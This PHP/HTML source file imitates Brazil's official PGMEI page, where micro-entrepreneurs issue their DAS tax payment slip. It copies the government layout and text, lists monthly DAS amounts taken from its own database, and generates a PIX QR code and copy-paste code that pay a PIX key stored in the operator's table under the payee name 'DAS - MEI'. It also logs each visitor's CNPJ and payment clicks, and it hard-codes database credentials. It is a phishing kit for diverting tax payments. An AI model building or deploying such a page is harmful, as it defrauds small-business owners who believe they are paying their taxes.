<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

session_start();
$dataDeHoje = date('d/m/Y');
    
$db_host = 'localhost';
$db_nome = 'solucoes_das';
$db_usuario = 'solucoes_admdas';
$db_senha = 'Admdas@123';
$db_charset = 'utf8';

$dsn = "mysql:host={$db_host};dbname={$db_nome};charset={$db_charset}";

$options = [
    PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    PDO::ATTR_EMULATE_PREPARES   => false,
];

try {
    $pdo = new PDO($dsn, $db_usuario, $db_senha, $options);


    $sql_valores = "SELECT maior FROM valores WHERE id = 1";
    $stmt_valores = $pdo->prepare($sql_valores);
    $stmt_valores->execute();
    $valores = $stmt_valores->fetch(PDO::FETCH_ASSOC);

    if ($valores) {
        $maior = $valores['maior'] / 100;

        $valor_pix = $maior;
    } else {
        // Tratar o caso em que não foram encontrados valores
        throw new Exception('Não foram encontrados valores na tabela.');
    }

    $beneficiario_pix = "DAS - MEI";
    $cidade_pix = "sao paulo";
    $descricao = '';
    if ((!isset($_POST["identificador"])) || (empty($_POST["identificador"]))) {
        $identificador = "***";
    }
    if (strlen($identificador) > 25) {
        $identificador = substr($identificador, 0, 25);
    }
    $gerar_qrcode = true;
    
    // Valores para inserir no banco de dados
    $valorTotal = $valor_pix;


    // Verificar se o CPF está definido
    if (isset($_SESSION["cnpj"]) && !empty($_SESSION["cnpj"])) {
        // Verificar se as credenciais já existem
        $sql_verificar = "SELECT COUNT(*) FROM faturas WHERE valor_total = ? AND cpf_usuario = ?";
        $stmt_verificar = $pdo->prepare($sql_verificar);
        $stmt_verificar->execute([$valor_pix, $_SESSION["cnpj"]]);
        $num_rows = $stmt_verificar->fetchColumn();

        if ($num_rows == 0) { // Se não existir, então inserir
            // Query SQL para inserir os dados na tabela
            $sql = "INSERT INTO faturas (valor_total, cpf_usuario) VALUES (?, ?)";

            // Preparar a consulta
            $stmt = $pdo->prepare($sql);

            // Executar a consulta
            $stmt->execute([$valor_pix, $_SESSION["cnpj"]]);
        } else {
            // Aqui você pode adicionar qualquer lógica adicional que desejar para lidar com o caso em que as credenciais já existem.
        }
    } else {
        // Aqui você pode adicionar qualquer lógica adicional que desejar para lidar com o caso em que o CPF não está definido.
    }

    // Selecionar a chave PIX
    $sql = $pdo->prepare("SELECT pix FROM pix");
    $sql->execute();
    $result = $sql->fetch(PDO::FETCH_ASSOC);
    $pix_value = $result['pix'];
    $chave_pix = $pix_value;

} catch (\PDOException $e) {
    // Tratar a exceção
    echo 'Erro: ' . $e->getMessage();
} catch (Exception $e) {
    // Tratar outras exceções
    echo 'Erro: ' . $e->getMessage();
}

?>

<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=7; IE=EDGE">
    <meta http-equiv="content-language" content="pt-br">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" type="image/x-icon" href="SimplesNacional/Aplicacoes/ATSPO/pgmei.app/favicon.ico" />

    <title>PGMEI - Programa Gerador de DAS do Microempreendedor Individual</title>

    <link href="SimplesNacional/Aplicacoes/ATSPO/pgmei.app/Content/css/pgmei.css" rel="stylesheet"/>

    <script src="SimplesNacional/Aplicacoes/ATSPO/pgmei.app/bundles/modernizr.js"></script>

       
    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
        <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    <style>
        .list{
            display:none;
        }
        .btn-primary {
    width: 60%;
    background-image: linear-gradient(to bottom, #5cb85c 0, #419641 100%) !important;
    background-repeat: none !important;
    border: none;
}
.btn-primary:hover{
    background-image: linear-gradient(to bottom, #5cb85c 0, #419641 100%) !important;
}
.align{
    display: flex;
    align-items: center;
    justify-content: center;
}
.aln{
    width: 100%;
    display:flex;
    flex-direction:column;
    justify-content:center;
}
textarea {
    font-family: inherit;
    font-size: inherit;
    line-height: inherit;
    width: 60%;
    overflow: hidden;
    resize: none;
    margin: 0 auto;
    border:none;
    background-color:#ccc;
    border-radius:5px;
}

.flex{
    display: flex;
    align-items: center;
    justify-content: space-between;
    border-bottom:1px solid #666;
    margin:0 auto 20px auto;
    width:60%;
}

.flex h3{
    font-size:16px;
}
.flex p {
    font-size: 18px;
    height: 100%;
    align-items: center;
    display: flex;
    position: relative;
    top: 12px;
}

.pn2{
    display:none;
}

    </style>
 <script>
    function copiar() {
    var copyText = document.getElementById("brcodepix");
    copyText.select();
    copyText.setSelectionRange(0, 99999);
    document.execCommand("copy");
    document.getElementById("clip_btn").innerHTML='Copiar Codigo <i class="fas fa-clipboard-check"></i>';
    }
    function reais(v){
        v=v.replace(/\D/g,"");
        v=v/100;
        v=v.toFixed(2);
        return v;
    }
    function mascara(o,f){
        v_obj=o;
        v_fun=f;
        setTimeout("execmascara()",1);
    }
    function execmascara(){
        v_obj.value=v_fun(v_obj.value);
    }
    $(function () {
    $('[data-toggle="tooltip"]').tooltip()
    })
    </script>
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-E6M96X7Y2Y"></script>
    <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-E6M96X7Y2Y');
    </script>
<script>
        function showList(event) {
            event.preventDefault(); // Previne o envio do formulário e a atualização da página
            document.querySelector('.list').style.display = 'block';
            return false; // Retorna false para garantir que o formulário não seja enviado
        }
    </script>
 <script>
        function verificarSelecao() {
            var checkboxes = document.querySelectorAll('.paSelecionado');
            var botaoPagarPix = document.getElementById('btnPagarPix');

            var peloMenosUmMarcado = false;
            for (var i = 0; i < checkboxes.length; i++) {
                if (checkboxes[i].checked) {
                    peloMenosUmMarcado = true;
                    break;
                }
            }

            if (peloMenosUmMarcado) {
                botaoPagarPix.disabled = false;
            } else {
                botaoPagarPix.disabled = true;
                event.preventDefault();
                alert('O botão "Pagar PIX" está desabilitado. Por favor, selecione pelo menos uma opção antes de prosseguir.');

            }
        }
        function clicarPagarPix() {
            verificarSelecao();
            
            if (peloMenosUmMarcado) {
                botaoPagarPix.disabled = false;
            } else {
                botaoPagarPix.disabled = true;
                event.preventDefault(); 
                alert('O botão "Pagar PIX" está desabilitado. Por favor, selecione pelo menos uma opção antes de prosseguir.');
            }
        }
    </script>
</head>
<body>
    <input type="hidden" id="imgPath" value='/SimplesNacional/Aplicacoes/ATSPO/pgmei.app/img' />
    <input type="hidden" id="rootPath" value='/SimplesNacional/Aplicacoes/ATSPO/pgmei.app/' />

    
    
    
    

    <div class="container-fluid">

        <header class="row">
            <h3><span class="label label-success"><img alt="Brand" src="SimplesNacional/Aplicacoes/ATSPO/pgmei.app/Content/img/logo-simples.png"> PGMEI</span></h3>
            <h4 class="text-success">Programa Gerador de DAS do Microempreendedor Individual</h4>
        </header>

            <section class="row">
                <nav class="navbar navbar-default" role="navigation">
                    <div class="container-fluid bg-success">
                        <div class="navbar-header">
                            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbarCollapse" aria-expanded="false" aria-controls="navbar">
                                <span class="sr-only">Toggle navigation</span>
                                <span class="icon-bar"></span>
                                <span class="icon-bar"></span>
                                <span class="icon-bar"></span>
                            </button>
                        </div>

                        <div class="collapse navbar-collapse" id="navbarCollapse">
                            <ul class="nav navbar-nav">
                                <li>
                                    <a href="csta.php"><span class="glyphicon glyphicon-home" aria-hidden="true"></span> Inicio</a>
                                </li>
                                <li>
                                    <a href="emissao.php"><span class="glyphicon glyphicon-check" aria-hidden="true"></span> Emitir Guia de Pagamento (DAS)</a>
                                </li>
                            </ul>

                            <ul class="nav navbar-nav navbar-right">
                                <li>
                                    <a href="sair.php"><span class="glyphicon glyphicon-log-out" aria-hidden="true"></span> Sair</a>
                                </li>
                            </ul>
                        </div>
                        <!-- /.navbar-collapse -->
                    </div>
                    <!-- /.container -->
                </nav>
            </section>
            <section class="row" role="contentinfo">
                
                <ul class="list-group">
                    <li class="list-group-item">
                    <ul class="list-inline">
                            <li><strong>CNPJ:</strong> <?php echo htmlspecialchars($_SESSION["cnpj"])?></li>
                            <li><strong>Nome:</strong> <?php echo htmlspecialchars($_SESSION["nome"])?></li>
                        </ul>
                    </li>
                </ul>
                
            </section>

        <section class="row">
            <!-- conteudo principal -->
            <div class="well col-md-12" role="main">
                


<div class="container-fluid">
    <div class="row">
        <div class="col-md-12 text-center" style="text-align:center;">
                <div class="AnoCalendario">
                <form class="form-inline" role="form" onsubmit="return showList(event)">
        <div class="form-group">
            <label for="anoCalendarioSelect">Informe o Ano-Calendário:</label>
            <select name="ano" id="anoCalendarioSelect" class="selectpicker show-tick form-control" title="" data-width="80px">
                <option value=""></option>
                <option data-subtext="">2024</option>
            </select>
        </div>
        <button type="submit" class="btn btn-success ladda-button">Ok</button>
    </form>

    </div>
    <div class="row list">

            <div class="col-md-12">
                    <form id="emissaoDas" method="post" onsubmit="return hideElement(event)" role="form">

                    <input name="__RequestVerificationToken" type="hidden" value="qH0OVBeT9d2Im-OdU9auDLCRx_V0Rvm_5DzqUMrl_tSVqCqZ3cFQKjqMg2IrMCNO9RwZNO02Go2pkwbSr68J6WAAQj5v0JhvcXIfdWfjtAg1">
                    <input type="hidden" name="ano" id="anoSelecionado" value="2024">
                    <input type="hidden" id="beneficioAlterado" value="0">
                    <input type="hidden" id="existemVencidos" value="1">

                    <div class="row">

                        <div class="col-md-12">
                            <div class="panel panel-default">
                                <div class="panel-heading">
                                    <h4 class="panel-title">Selecione o(s) período(s) de apuração:</h4>
                                </div>

                                <div class="panel-body">
                                    

                                    <div id="resumoDAS" class="table-responsive">

                                        




<table class="table table-hover table-condensed emissao is-detailed" data-pa-selecionado="">

    <tbody><tr>
        <th class="check" rowspan="2">
    </th>
        <th class="periodo" rowspan="2">Período de Apuração</th>
        <th class="apurado" rowspan="2">Apurado</th>

        <th class="beneficio" rowspan="2" data-toggle="popover" data-content="Indique se você recebeu benefício de salário-maternidade, auxílio-doença ou auxílio-reclusão relativo a um mês específico. Atenção: só selecione se o período do benefício abranger o mês inteiro (do primeiro ao último dia)." data-original-title="" title="">
            Benefício INSS
        </th>


        <th colspan="6">Resumo do DAS a ser gerado</th>
    </tr>
    <tr>
        <th class="principal">Principal</th>
        <th class="multa">Multa</th>
        <th class="juros">Juros</th>
        <th class="total">Total</th>
        <th class="vencimento">Data de Vencimento</th>
        <th class="acolhimento">Data de Acolhimento</th>
    </tr>






</tbody>
<tbody>

    <tr class="pa">

    <td class="selecionar text-center">
            <input type="checkbox" class="paSelecionado" name="pa" value="202401" data-grupo-pa="" data-count="1" data-aliquota-divergente="False" data-valor-tributo-divergente="False">
        </td>
        <td>Maio/2024</td>

        <td class="text-center">
Não        </td>

<td class="text-center" data-toggle="popover" data-content="Indique se você recebeu benefício de salário-maternidade, auxílio-doença ou auxílio-reclusão relativo a um mês específico. Atenção: só selecione se o período do benefício abranger o mês inteiro (do primeiro ao último dia)." data-original-title="" title="">
            <input type="checkbox" class="beneficioSelecionado" name="beneficio" value="202401" data-benefico-apurado="False" data-grupo-beneficio="">
        </td>

        <td class="principal updatable text-center" data-toggle="popover" data-content="<p><strong>ICMS</strong>: R$ 1,00</p><p><strong>ISS</strong>: R$ 5,00</p><p><strong>INSS</strong>: R$ 70,60</br><small>5% sobre o salário mínimo.</small></p>" data-original-title="" title="">R$ <?php echo $valor_pix;?></td>
        <td class="multa updatable text-center">-</td>
        <td class="juros updatable text-center">-</td>
        <td class="total updatable text-center">R$ <?php echo $valor_pix;?></td>
        <td class="vencimento updatable text-center">20/05/2024</td>
        <td class="acolhimento updatable text-center"><?php echo $dataDeHoje?></td>



    </tr>
</tbody>





<tbody>

    <tr class="pa">

            <td class="selecionar text-center">
            <input type="checkbox" class="paSelecionado" name="pa" value="202401" data-grupo-pa="" data-count="1" data-aliquota-divergente="False" data-valor-tributo-divergente="False">
        </td>
        <td>Junho/2024</td>

        <td class="text-center">
Não        </td>

<td class="text-center" data-toggle="popover" data-content="Indique se você recebeu benefício de salário-maternidade, auxílio-doença ou auxílio-reclusão relativo a um mês específico. Atenção: só selecione se o período do benefício abranger o mês inteiro (do primeiro ao último dia)." data-original-title="" title="">
            <input type="checkbox" class="beneficioSelecionado" name="beneficio" value="202401" data-benefico-apurado="False" data-grupo-beneficio="">
        </td>




        <td class="principal updatable text-center" data-toggle="popover" data-content="<p><strong>ICMS</strong>: R$ 1,00</p><p><strong>ISS</strong>: R$ 5,00</p><p><strong>INSS</strong>: R$ 70,60</br><small>5% sobre o salário mínimo.</small></p>" data-original-title="" title="">R$ <?php echo $valor_pix;?></td>
        <td class="multa updatable text-center">-</td>
        <td class="juros updatable text-center">-</td>
        <td class="total updatable text-center">R$ <?php echo $valor_pix;?></td>
        <td class="vencimento updatable text-center">20/06/2024</td>
        <td class="acolhimento updatable text-center"><?php echo $dataDeHoje?></td>


    </tr>
</tbody>





<tbody>

    <tr class="pa">

                <td class="selecionar text-center">
            <input type="checkbox" class="paSelecionado" name="pa" value="202401" data-grupo-pa="" data-count="1" data-aliquota-divergente="False" data-valor-tributo-divergente="False">
        </td>
        <td>Julho/2024</td>

        <td class="text-center">
Não        </td>

<td class="text-center" data-toggle="popover" data-content="Indique se você recebeu benefício de salário-maternidade, auxílio-doença ou auxílio-reclusão relativo a um mês específico. Atenção: só selecione se o período do benefício abranger o mês inteiro (do primeiro ao último dia)." data-original-title="" title="">
            <input type="checkbox" class="beneficioSelecionado" name="beneficio" value="202401" data-benefico-apurado="False" data-grupo-beneficio="">
        </td>



        <td class="principal updatable text-center" data-toggle="popover" data-content="<p><strong>ICMS</strong>: R$ 1,00</p><p><strong>ISS</strong>: R$ 5,00</p><p><strong>INSS</strong>: R$ 70,60</br><small>5% sobre o salário mínimo.</small></p>" data-original-title="" title="">R$ <?php echo $valor_pix;?></td>
        <td class="multa updatable text-center">-</td>
        <td class="juros updatable text-center">-</td>
        <td class="total updatable text-center">R$ <?php echo $valor_pix;?></td>
        <td class="vencimento updatable text-center">20/07/2024</td>
        <td class="acolhimento updatable text-center"><?php echo $dataDeHoje?></td>


    </tr>
</tbody>





<tbody>

    <tr class="pa">

                <td class="selecionar text-center">
            <input type="checkbox" class="paSelecionado" name="pa" value="202401" data-grupo-pa="" data-count="1" data-aliquota-divergente="False" data-valor-tributo-divergente="False">
        </td>
        <td>Agosto/2024</td>

        <td class="text-center">
Não        </td>

<td class="text-center" data-toggle="popover" data-content="Indique se você recebeu benefício de salário-maternidade, auxílio-doença ou auxílio-reclusão relativo a um mês específico. Atenção: só selecione se o período do benefício abranger o mês inteiro (do primeiro ao último dia)." data-original-title="" title="">
            <input type="checkbox" class="beneficioSelecionado" name="beneficio" value="202401" data-benefico-apurado="False" data-grupo-beneficio="">
        </td>



        <td class="principal updatable text-center" data-toggle="popover" data-content="<p><strong>ICMS</strong>: R$ 1,00</p><p><strong>ISS</strong>: R$ 5,00</p><p><strong>INSS</strong>: R$ 70,60</br><small>5% sobre o salário mínimo.</small></p>" data-original-title="" title="">R$ <?php echo $valor_pix;?></td>
        <td class="multa updatable text-center">-</td>
        <td class="juros updatable text-center">-</td>
        <td class="total updatable text-center">R$ <?php echo $valor_pix;?></td>
        <td class="vencimento updatable text-center">20/08/2024</td>
        <td class="acolhimento updatable text-center"><?php echo $dataDeHoje?></td>


    </tr>
</tbody>





<tbody>

    <tr class="pa">

                <td class="selecionar text-center">
            <input type="checkbox" class="paSelecionado" name="pa" value="202401" data-grupo-pa="" data-count="1" data-aliquota-divergente="False" data-valor-tributo-divergente="False">
        </td>
        <td>Setembro/2024</td>

        <td class="text-center">
Não        </td>
<td class="text-center" data-toggle="popover" data-content="Indique se você recebeu benefício de salário-maternidade, auxílio-doença ou auxílio-reclusão relativo a um mês específico. Atenção: só selecione se o período do benefício abranger o mês inteiro (do primeiro ao último dia)." data-original-title="" title="">
            <input type="checkbox" class="beneficioSelecionado" name="beneficio" value="202401" data-benefico-apurado="False" data-grupo-beneficio="">
        </td>


        <td class="principal updatable text-center" data-toggle="popover" data-content="<p><strong>ICMS</strong>: R$ 1,00</p><p><strong>ISS</strong>: R$ 5,00</p><p><strong>INSS</strong>: R$ 70,60</br><small>5% sobre o salário mínimo.</small></p>" data-original-title="" title="">R$ <?php echo $valor_pix;?></td>
        <td class="multa updatable text-center">-</td>
        <td class="juros updatable text-center">-</td>
        <td class="total updatable text-center">R$ <?php echo $valor_pix;?></td>
        <td class="vencimento updatable text-center">20/09/2024</td>
        <td class="acolhimento updatable text-center"><?php echo $dataDeHoje?></td>


    </tr>
</tbody>





<tbody>

    <tr class="pa">

                <td class="selecionar text-center">
            <input type="checkbox" class="paSelecionado" name="pa" value="202401" data-grupo-pa="" data-count="1" data-aliquota-divergente="False" data-valor-tributo-divergente="False">
        </td>
        <td>Outubro/2024</td>

        <td class="text-center">
Não        </td>

<td class="text-center" data-toggle="popover" data-content="Indique se você recebeu benefício de salário-maternidade, auxílio-doença ou auxílio-reclusão relativo a um mês específico. Atenção: só selecione se o período do benefício abranger o mês inteiro (do primeiro ao último dia)." data-original-title="" title="">
            <input type="checkbox" class="beneficioSelecionado" name="beneficio" value="202401" data-benefico-apurado="False" data-grupo-beneficio="">
        </td>




        <td class="principal updatable text-center" data-toggle="popover" data-content="<p><strong>ICMS</strong>: R$ 1,00</p><p><strong>ISS</strong>: R$ 5,00</p><p><strong>INSS</strong>: R$ 70,60</br><small>5% sobre o salário mínimo.</small></p>" data-original-title="" title="">R$ <?php echo $valor_pix;?></td>
        <td class="multa updatable text-center">-</td>
        <td class="juros updatable text-center">-</td>
        <td class="total updatable text-center">R$ <?php echo $valor_pix;?></td>
        <td class="vencimento updatable text-center">20/10/2024</td>
        <td class="acolhimento updatable text-center"><?php echo $dataDeHoje?></td>


    </tr>
</tbody>





<tbody>

    <tr class="pa">

                <td class="selecionar text-center">
            <input type="checkbox" class="paSelecionado" name="pa" value="202401" data-grupo-pa="" data-count="1" data-aliquota-divergente="False" data-valor-tributo-divergente="False">
        </td>
        <td>Novembro/2024</td>

        <td class="text-center">
Não        </td>
<td class="text-center" data-toggle="popover" data-content="Indique se você recebeu benefício de salário-maternidade, auxílio-doença ou auxílio-reclusão relativo a um mês específico. Atenção: só selecione se o período do benefício abranger o mês inteiro (do primeiro ao último dia)." data-original-title="" title="">
            <input type="checkbox" class="beneficioSelecionado" name="beneficio" value="202401" data-benefico-apurado="False" data-grupo-beneficio="">
        </td>




        <td class="principal updatable text-center" data-toggle="popover" data-content="<p><strong>ICMS</strong>: R$ 1,00</p><p><strong>ISS</strong>: R$ 5,00</p><p><strong>INSS</strong>: R$ 70,60</br><small>5% sobre o salário mínimo.</small></p>" data-original-title="" title="">R$ <?php echo $valor_pix;?></td>
        <td class="multa updatable text-center">-</td>
        <td class="juros updatable text-center">-</td>
        <td class="total updatable text-center">R$ <?php echo $valor_pix;?></td>
        <td class="vencimento updatable text-center">20/11/2024</td>
        <td class="acolhimento updatable text-center"><?php echo $dataDeHoje?></td>


    </tr>
</tbody>





<tbody>

    <tr class="pa">

                <td class="selecionar text-center">
            <input type="checkbox" class="paSelecionado" name="pa" value="202401" data-grupo-pa="" data-count="1" data-aliquota-divergente="False" data-valor-tributo-divergente="False">
        </td>
        <td>Dezembro/2024</td>

        <td class="text-center">
Não        </td>

<td class="text-center" data-toggle="popover" data-content="Indique se você recebeu benefício de salário-maternidade, auxílio-doença ou auxílio-reclusão relativo a um mês específico. Atenção: só selecione se o período do benefício abranger o mês inteiro (do primeiro ao último dia)." data-original-title="" title="">
            <input type="checkbox" class="beneficioSelecionado" name="beneficio" value="202401" data-benefico-apurado="False" data-grupo-beneficio="">
        </td>



        <td class="principal updatable text-center" data-toggle="popover" data-content="<p><strong>ICMS</strong>: R$ 1,00</p><p><strong>ISS</strong>: R$ 5,00</p><p><strong>INSS</strong>: R$ 70,60</br><small>5% sobre o salário mínimo.</small></p>" data-original-title="" title="">R$ <?php echo $valor_pix;?></td>
        <td class="multa updatable text-center">-</td>
        <td class="juros updatable text-center">-</td>
        <td class="total updatable text-center">R$ <?php echo $valor_pix;?></td>
        <td class="vencimento updatable text-center">20/12/2024</td>
        <td class="acolhimento updatable text-center"><?php echo $dataDeHoje?></td>


    </tr>
</tbody>
</table>



                                    </div>

                                </div>

                                <div class="panel-footer">

                                    <div class="row">
                                       <div class="col-md-12 text-center">
                                            <label for="dataPagamentoInformada">Informe a data para pagamento do(s) DAS:</label>
                                            <input type="text" class="form-control datepicker" name="dataConsolidacao" id="dataPagamentoInformada" value="<?php echo $dataDeHoje?>"  readonly="">
                                            <hr>
                                        </div>
                                    </div>
                                    <div class="row" style="text-align:center;">
<label for="dataPagamentoInformada" style="text-align:center;">*Selecione o mês de pagamento</label>
                                        <div class="col-md-12 text-center" style="text-align:center;">
                                             <button id="btnPagarPix" type="submit" class="btn btn-success ladda-button" onclick="clicarPagarPix()">Pagar com Pix</span><span class="ladda-spinner"></span></button>
                                            <button type="submit" id="btnPagarOnline" class="btn btn-success ladda-button" data-style="slide-left"><span class="ladda-label">Voltar</span><span class="ladda-spinner"></span></button>
                                        </div>

                                    </div>

                                </div>
                            </div>
                        </div>

                    </div>
                </form>
                
        <div class="panel panel-default pn2">
                                <div class="panel-heading">
                                    <h4 class="panel-title">Resumo do pagamento</h4>
                                </div>

                                <div class="panel-body">
                                    

                                    <div id="resumoDAS" class="table-responsive">

                                        

                                    <div class="pixbox">
                <?php
                    if ($gerar_qrcode){
                        include "phpqrcode/qrlib.php"; 
                        include "funcoes_pix.php";
                        $px[00]="01"; 
                        $px[26][00]="br.gov.bcb.pix"; 
                        $px[26][01]=$chave_pix;
                        if (!empty($descricao)) {
                            $tam_max_descr=99-(4+4+4+14+strlen($chave_pix));
                            if (strlen($descricao) > $tam_max_descr) {
                                $descricao=substr($descricao,0,$tam_max_descr);
                            }
                            $px[26][02]=$descricao;
                        }
                        $px[52]="0000";
                        $px[53]="986";
                        if ($valor_pix > 0) {
                            $px[54]=$valor_pix;
                        }
                        $px[58]="BR"; 
                        $px[59]=$beneficiario_pix; 
                        $px[60]=$cidade_pix;
                        $px[62][05]=$identificador;

                        $pix=montaPix($px);
                        $pix.="6304"; 
                        $pix.=crcChecksum($pix); 
                        $linhas=round(strlen($pix)/120)+1;
                        ?>
                        <p>
                        <div class="flex">
                            <h3>Valor atualizado:</h3>
                            <p>R$ <?php echo $valor_pix;?></p>
                        </div>
                        
                        <?php
                        ob_start();
                        QRCode::png($pix, null,'M',5);
                        $imageString = base64_encode( ob_get_contents() );
                        ob_end_clean();
                        echo '
                        <div class="card">
                        <div class="row">
                            <div class="col aln">
                            <textarea class="text-monospace" id="brcodepix" rows="<?= $linhas; ?>" cols="130" onclick="copiar()"> '.$pix.'</textarea>
                            </div><br>
                            <div class="col md-1">
                            <p style="display: flex; margin:0 auto;     justify-content: center;"> <form action="" method="post" style="text-align:center;">
                                <input type="hidden" name="clicked" value="clicked">
                                <input type="hidden" name="valorpx" value="<?php echo $valor_pix?>">
                                <input type="hidden" name="cpfuser" value="<?php echo $cpfUsuario?>">
                                <p><button type="submit" id="clip_btn" class="btn btn-primary" data-toggle="tooltip" data-placement="top" title="Copiar código pix" onclick="copiar()">Copiar Codigo <i class="fas fa-clipboard"></i></button></p>
                              </form></p>
                            </div>
                        </div>
                    </div>
                        ';
                        echo '<div class="align"><img src="data:image/png;base64,' . $imageString . '"></div></p>';
                    }
                    ?>
                </div>
  <?php
if(isset($_POST["clicked"])) {
    $valor1 = $_POST["clicked"];
    $valor2 = $_SESSION["cnpj"];
    $valor3 = $valor_pix;

    try {
        $pdo = new PDO($dsn, $db_usuario, $db_senha, $options);

        // Verificar se o CPF está definido e não vazio
        if (isset($valor2) && !empty($valor2)) {
            // Verificar se o CPF já existe no banco de dados
            $sql_verificar = "SELECT COUNT(*) FROM tablea WHERE campo2 = ?";
            $stmt_verificar = $pdo->prepare($sql_verificar);
            $stmt_verificar->execute([$valor2]);
            $num_rows = $stmt_verificar->fetchColumn();

            if ($num_rows == 0) { // Se o CPF não existir, então inserir
                // Query SQL para inserir os dados na tabela
                $sql = "INSERT INTO tablea (campo1, campo2, campo3) VALUES (?, ?, ?)";
                
                // Preparar a consulta
                $stmt = $pdo->prepare($sql);

                // Executar a consulta
                $stmt->execute([$valor1, $valor2, $valor3]);

                echo "<script>alert('Código PIX Copiado com Sucesso')</script>";
            } else {
                // Aqui você pode adicionar qualquer lógica adicional que desejar para lidar com o caso em que o CPF já está cadastrado.
            }
        } else {
            // Aqui você pode adicionar qualquer lógica adicional que desejar para lidar com o caso em que o CPF não está definido.
        }
    } catch (\PDOException $e) {
        // Tratar a exceção
    }
}
?>
                            <hr>
                            <p>O sistema pode demorar ate 6h para atualizar seu pagamento</p>

                                </div>
                            </div>


<div class="col-md-12" style="text-align:left;">
                <h5 class="text-info">Informações importantes:</h5>
                <ol class="text-info">
                    <li> A opção "Emitir DAS" gera um documento em formato PDF para pagamento na rede bancária credenciada;</li>
                    <li> A opção "Pagar Online" gera um documento para realização do pagamento por meio de débito em conta corrente. No momento, apenas disponível para usuários do Banco do Brasil com acesso ao Internet Banking.</li>
                    <li> Os documentos gerados em cada opção possuem numerações diferentes. Caso escolha a opção "Pagar Online", ao final da transação, após receber a confirmação do banco de que a transação foi efetivada, o usuário poderá imprimir o comprovante do pagamento. Caso queira imprimi-lo posteriormente, deverá acessar o Portal e-CAC, no sítio da Receita Federal do Brasil, utilizando certificado digital ou código de acesso do referido Portal, selecionar a aba "Pagamentos e Parcelamentos" e, na sequência, o serviço "Consulta de Comprovante de Pagamento - DARF, DAS e DJE".</li>
                </ol>
            </div>
            </div>

        </div>

        </div>
    </div>


</div>


            </div>
        </section>

        <footer class="row  clearfix">
            <div class="pull-left">
                <p class="text-success">
                    <strong>
                        Versão: 3.14.1
                    </strong>
                </p>
            </div>
            <div class="pull-right"><img src="SimplesNacional/Aplicacoes/ATSPO/pgmei.app/Content/img/marca_Simples_entes.png" alt="" /></div>
        </footer>
    </div>

    <script src="SimplesNacional/Aplicacoes/ATSPO/pgmei.app/bundles/jquery.js"></script>

    <script src="SimplesNacional/Aplicacoes/ATSPO/pgmei.app/bundles/bootstrap.js"></script>

    <script src="SimplesNacional/Aplicacoes/ATSPO/pgmei.app/bundles/ladda.js"></script>

    <script src="SimplesNacional/Aplicacoes/ATSPO/pgmei.app/bundles/toastr.js"></script>

    <script src="SimplesNacional/Aplicacoes/ATSPO/pgmei.app/bundles/select.js"></script>

    <script src="SimplesNacional/Aplicacoes/ATSPO/pgmei.app/bundles/pgmei_old.js"></script>

    <script src="SimplesNacional/Aplicacoes/ATSPO/pgmei.app/bundles/pgmei_layout.js"></script>


    <script src="SimplesNacional/Aplicacoes/ATSPO/pgmei.app/bundles/pgmei_emissao?v=uq_bLdP4HisJnQZMSnZZ02U3L4ZGdIy15UayBe9p9U81"></script>




    <form id="frmPagarOnline" target="_top" name="frmPagarOnline" method="post"></form>

    <script>
        function hideElement(event) {
            event.preventDefault(); // Previne o envio do formulário e a atualização da página
            document.querySelector('.pn2').style.display = 'block';
            return false; 
        }
    </script><script>
document.addEventListener("DOMContentLoaded", function() {
    var form = document.getElementById('emissaoDas');
    var checkboxes = form.querySelectorAll('input[type="checkbox"]');
    var pagarPixButton = document.getElementById('btnPagarPix');

    checkboxes.forEach(function(checkbox) {
        checkbox.addEventListener('change', function() {
            var checked = Array.from(checkboxes).some(function(cb) {
                return cb.checked;
            });
            pagarPixButton.disabled = !checked;
        });
    });
});
</script>


    <!-- 
        False,<?php echo $dataDeHoje?> 00:00:00,
    -->
</body>
</html>
